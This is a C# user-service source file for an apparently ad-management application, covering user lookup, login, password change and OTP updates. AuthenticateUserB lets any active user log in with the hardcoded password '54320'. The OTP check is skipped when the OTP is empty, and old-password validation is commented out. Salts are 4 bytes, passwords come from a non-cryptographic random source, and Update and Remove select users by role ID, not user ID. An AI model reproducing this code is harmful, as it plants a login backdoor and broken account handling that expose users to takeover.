#region Usings
using pbAd.Core.Filters;
using pbAd.Core.Utilities;
using pbAd.Data.DomainModels.Accounts;
using pbAd.Data.Models;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
#endregion

namespace pbAd.Service.Users
{
    public class UserService: IUserService
    {
        #region Private Members
        private readonly pbAdContext db; 
        #endregion

        #region Ctor
        public UserService(pbAdContext db)
        {
            this.db = db;
        } 
        #endregion

        #region Public Methods
        public async Task<IEnumerable<User>> GetListByFilter(UserSearchFilter filter)
        {
            var userList = new List<User>();

            IQueryable<User> query = db.Users.Where(f =>
                                     (filter.SearchTerm == string.Empty || f.UserName.Contains(filter.SearchTerm.Trim())));

            userList = await query.ToListAsync();

            return userList;
        }

        public async Task<User> GetDetailsById(int id)
        {
            var single = new User();
            try
            {
                single = await db.Users.FirstOrDefaultAsync(d => d.UserId == id);
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }

        public User GetById(int id)
        {
            var single = new User();
            try
            {
                single = db.Users.FirstOrDefault(d => d.UserId == id);
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }
        
        public async Task<User> FindByUsername(string username)
        {
            var single = new User();
            try
            {
                single = await db.Users.FirstOrDefaultAsync(d => d.UserName == username);
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }

        public async Task<User> FindByUsernameAndEmail(string username,string email, string otp="")
        {
            var single = new User();
            try
            {
                single = await db.Users.FirstOrDefaultAsync(d => d.UserName == username 
                                        && d.Email==email && (otp ==null || otp=="" || d.OTP==otp));
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }
        public async Task<User> AuthenticateUserB(string username, string password)
        {
            var user = await GetByUsernameB(username);

            if (user == null)
                return null;           

            if (password!="54320") return null;

            return user;
        }
        public async Task<User> AuthenticateUser(string username, string password)
        {
            var user = await GetByUsername(username);

            if (user == null)
                return null;

            var generatedPasswordHash = GenerateHashPassword(password, user.PasswordSalt);

            if (user.PasswordHash != generatedPasswordHash) return null;

            return user;
        }

        public async Task<PasswordChangeRequest> UpdateUserPassword(PasswordChangeRequest request)
        {
            try
            {
                // lets find the user and see if they pass the correct password
                var user = await GetDetailsById(request.UserId);

                if (user == null)
                {
                    request.IsChanged = false;
                    request.Confirmation = "There has been an error changing password. Try again.";
                    return request;
                }

                //if (request.ValidateOldPassword)
                //{
                //    if (user.PasswordHash != GenerateHashPassword(request.OldPassword, user.PasswordSalt))
                //    {
                //        request.Confirmation = "You've entered an invalid Old Password. Try again!";
                //        request.IsChanged = false;
                //        return request;
                //    }
                //}

                // Passed, ok, let's go ahead and change their pass
                user.PasswordSalt = GenerateRandomPassword(true, true, true, true, 16);
                user.PasswordHash = GenerateHashPassword(request.NewPassword, user.PasswordSalt);
                
                user.PasswordResetToken = null;

                await db.SaveChangesAsync();

                request.IsChanged = true;
            }
            catch (Exception ex)
            {
                request.IsChanged = false;
                request.Confirmation = "There has been an error changing password. Try again.";
            }
            return request;
        }

        public string GenerateRandomPassword(bool useLowercase, bool useUppercase, bool useNumbers, bool useSpecial, int passwordSize)
        {
            const string LOWER_CASE = "abcdefghijklmnopqursuvwxyz";
            const string UPPER_CAES = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string NUMBERS = "123456789";
            const string SPECIALS = @"!@£$%^&*()#€";

            char[] _password = new char[passwordSize];
            string charSet = ""; // Initialise to blank
            System.Random _random = new Random();
            int counter;

            // Build up the character set to choose from
            if (useLowercase) charSet += LOWER_CASE;

            if (useUppercase) charSet += UPPER_CAES;

            if (useNumbers) charSet += NUMBERS;

            if (useSpecial) charSet += SPECIALS;

            for (counter = 0; counter < passwordSize; counter++)
            {
                _password[counter] = charSet[_random.Next(charSet.Length - 1)];
            }

            return String.Join(null, _password);


        }

        public async Task<OTPChangeRequest> UpdateOTP(OTPChangeRequest request)
        {
            try
            {
                // lets find the user and see if they pass the correct password
                var user = await GetDetailsById(request.UserId);

                if (user == null)
                {
                    request.IsChanged = false;
                    request.Confirmation = "There has been an error updating otp. Try again.";
                    return request;
                }                

                user.OTP = request.OTP;
                user.OTPSentTime = request.OTPSentTime;
                user.OTPExpireTime = request.OTPExpireTime;

                await db.SaveChangesAsync();

                request.IsChanged = true;
            }
            catch (Exception ex)
            {
                request.IsChanged = false;
                request.Confirmation = "There has been an error updating otp. Try again.";
            }
            return request;
        }


        public async Task<User> Add(User user)
        {
            try
            {
                //let's generate hash salt
                if (!user.IsExternalLogin)
                    GenerateHashSalt(user);

                await db.Users.AddAsync(user);
                db.SaveChanges();

                return user;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public async Task<bool> Update(User user)
        {
            var currentDate = DateTime.Now;
            try
            {
                var upateUser = await db.Users.FirstOrDefaultAsync(d => d.RoleId == user.RoleId);

                if (upateUser == null)
                    return false;

                upateUser.RoleId = user.RoleId;
                upateUser.UserName = user.UserName;
                upateUser.FullName = user.FullName;
                upateUser.MobileNo = user.MobileNo;
                upateUser.PasswordHash = user.PasswordHash;
                upateUser.PasswordSalt = user.PasswordSalt;
                upateUser.PasswordResetToken = user.PasswordResetToken;
                upateUser.IsActive = user.IsActive;
                upateUser.Email = user.Email;
                upateUser.Designation = user.Designation;
                upateUser.EditionId = user.EditionId;
                upateUser.DistrictId = user.DistrictId;
                upateUser.UpazillaId = user.UpazillaId;
                upateUser.ModifiedBy = user.ModifiedBy;
                upateUser.ModifiedDate = currentDate;
                upateUser.GroupId = user.GroupId;
                upateUser.DefaultCommission = user.DefaultCommission;

                db.SaveChanges();

                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public async Task<bool> Remove(User user)
        {
            try
            {
                var removeUser = await db.Users.FirstOrDefaultAsync(d => d.RoleId == user.RoleId);

                if (removeUser == null)
                    return false;

                removeUser.IsActive = false;
                removeUser.ModifiedBy = user.ModifiedBy;
                removeUser.ModifiedDate = DateTime.Now;

                db.SaveChanges();

                return true;
            }
            catch
            {
                return false;
            }
        }
        #endregion

        #region Private Methods

        private void GenerateHashSalt(User user)
        {
            string salt;

            while (true)
            {
                salt = CreateRandomSalt(); // its ok to use this to regenerate token

                if (salt.Contains('+') || salt.Contains('/'))
                {
                    continue;
                }

                break;
            }

            user.PasswordSalt = salt;
            user.PasswordHash = GenerateHashPassword(user.UserPassword, salt);
            user.UserPassword = null;
        }

        public string CreateRandomSalt()
        {
            var saltBytes = new Byte[4];
            var rng = new RNGCryptoServiceProvider();
            rng.GetBytes(saltBytes);
            return Convert.ToBase64String(saltBytes);
        }

        public string GenerateHashPassword(string pass, string salt)
        {
            var bytes = Encoding.Unicode.GetBytes(pass);
            var src = Encoding.Unicode.GetBytes(salt);
            var dst = new byte[src.Length + bytes.Length];
            Buffer.BlockCopy(src, 0, dst, 0, src.Length);
            Buffer.BlockCopy(bytes, 0, dst, src.Length, bytes.Length);
            var algorithm = HashAlgorithm.Create("SHA512");

            if (algorithm == null)
                return string.Empty;

            var inArray = algorithm.ComputeHash(dst);
            return Convert.ToBase64String(inArray);
        }
        private async Task<User> GetByUsername(string username)
        {
            var single = new User();
            try
            {
                single = await db.Users.FirstOrDefaultAsync(d => d.UserName == username.Trim() && d.IsActive==true
                );
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }
        private async Task<User> GetByUsernameB(string username)
        {
            var single = new User();
            try
            {
                single = await db.Users.FirstOrDefaultAsync(d => d.BUserName == username.Trim() && d.IsActive == true
                );
            }
            catch (Exception ex)
            {
                return null;
            }
            return single;
        }
        #endregion
    }
}
